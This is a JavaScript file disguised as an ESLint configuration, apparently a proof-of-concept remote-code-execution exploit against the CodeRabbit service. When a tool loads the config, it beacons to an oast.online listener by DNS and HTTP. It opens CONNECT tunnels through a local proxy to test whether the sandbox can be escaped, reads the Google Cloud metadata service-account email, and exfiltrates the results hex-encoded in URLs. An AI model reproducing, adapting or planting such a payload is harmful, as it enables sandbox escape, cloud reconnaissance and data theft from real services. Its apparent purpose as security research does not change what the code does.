// CodeRabbit RCE — DEFINITIVE proxy-CONNECT escape confirmation.
// Disambiguates: plaintext tunnel vs TLS-terminated tunnel vs no-relay, and reads metadata.
// Markers /TPLAIN_proof and /TTLS_proof land DIRECTLY on our listener (grep ish.jsonl).
var C = 'd8sqasjoeaqo2i22kq00zh8i3hoy3ac7e.oast.online';
var http = require('http'), dns = require('dns'), net = require('net'), tls = require('tls');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 700), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive13.' + C, function () {}); } catch (e) {}

// open a CONNECT tunnel via the proxy; call onReady(socket) once "200" is seen
var connectTunnel = function (host, port, tag, onReady) {
  try {
    var s = net.connect({ host: '127.0.0.1', port: 1080, timeout: 12000 });
    var hdr = '', tun = false;
    s.on('connect', function () { s.write('CONNECT ' + host + ':' + port + ' HTTP/1.1\r\nHost: ' + host + ':' + port + '\r\n\r\n'); });
    s.on('data', function (d) {
      if (!tun) {
        hdr += d.toString('latin1');
        if (/\r\n\r\n/.test(hdr)) { tun = true; var line = hdr.split('\r\n')[0]; httpX(tag + '_c', line);
          if (/ 200/.test(line)) { try { onReady(s); } catch (e) {} } else { try { s.destroy(); } catch (e) {} } }
      }
    });
    s.on('error', function (e) { httpX(tag + '_c', 'ERR:' + ((e && e.code) || e)); });
    s.on('timeout', function () { httpX(tag + '_c', 'TO'); try { s.destroy(); } catch (e) {} });
  } catch (e) { httpX(tag + '_c', 'EXC'); }
};

// A1 — PLAINTEXT relay to our own listener (marker /TPLAIN_proof appears in ish.jsonl if it works)
connectTunnel(C, 80, 'plain', function (s) {
  s.write('GET /TPLAIN_proof HTTP/1.1\r\nHost: ' + C + '\r\nConnection: close\r\n\r\n');
  var r = ''; s.on('data', function (d) { r += d.toString('latin1'); }); s.on('close', function () { httpX('plain_r', r.slice(0, 150)); });
});

// A2 — TLS-over-tunnel relay to our listener (marker /TTLS_proof if the tunnel is TLS-terminated)
connectTunnel(C, 443, 'tlst', function (s) {
  try {
    var t = tls.connect({ socket: s, servername: C, rejectUnauthorized: false, timeout: 8000 }, function () {
      t.write('GET /TTLS_proof HTTP/1.1\r\nHost: ' + C + '\r\nConnection: close\r\n\r\n');
    });
    var r = ''; t.on('data', function (d) { r += d.toString('latin1'); }); t.on('close', function () { httpX('tls_r', r.slice(0, 150)); });
    t.on('error', function (e) { httpX('tls_e', ((e && (e.code || e.message)) || 'e').toString().slice(0, 80)); });
  } catch (e) { httpX('tls_x', '1'); }
});

// B — metadata via plaintext tunnel (SA email = impact proof; NOT the token)
connectTunnel('169.254.169.254', 80, 'md', function (s) {
  s.write('GET /computeMetadata/v1/instance/service-accounts/default/email HTTP/1.1\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n');
  var r = ''; s.on('data', function (d) { r += d.toString('latin1'); }); s.on('close', function () { httpX('md_r', r.slice(0, 300)); });
});

module.exports = { root: true, rules: {} };
